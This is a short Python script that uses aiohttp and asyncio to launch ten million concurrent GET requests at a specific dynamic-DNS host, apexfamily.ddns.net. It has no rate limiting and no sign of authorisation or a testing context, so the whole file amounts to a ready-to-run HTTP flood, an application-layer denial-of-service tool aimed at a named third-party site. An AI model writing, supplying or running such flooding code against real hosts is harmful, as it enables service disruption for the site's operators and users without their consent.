import aiohttp
import asyncio

# URL to send GET requests to
url = "https://apexfamily.ddns.net/"

# Number of requests to send
num_requests = 10000000  # You can adjust this as needed

# Function to send a GET request to the URL
async def send_get_request(session, url):
    try:
        async with session.get(url) as response:
            # You can process the response here if needed
            # For example, print the status code
            print(f"Status code for {url}: {response.status}")
    except Exception as e:
        print(f"Error for {url}: {e}")

# Create an asyncio event loop
async def main():
    async with aiohttp.ClientSession() as session:
        # Create a list of tasks for sending GET requests
        tasks = [send_get_request(session, url) for _ in range(num_requests)]

        # Execute the tasks concurrently
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
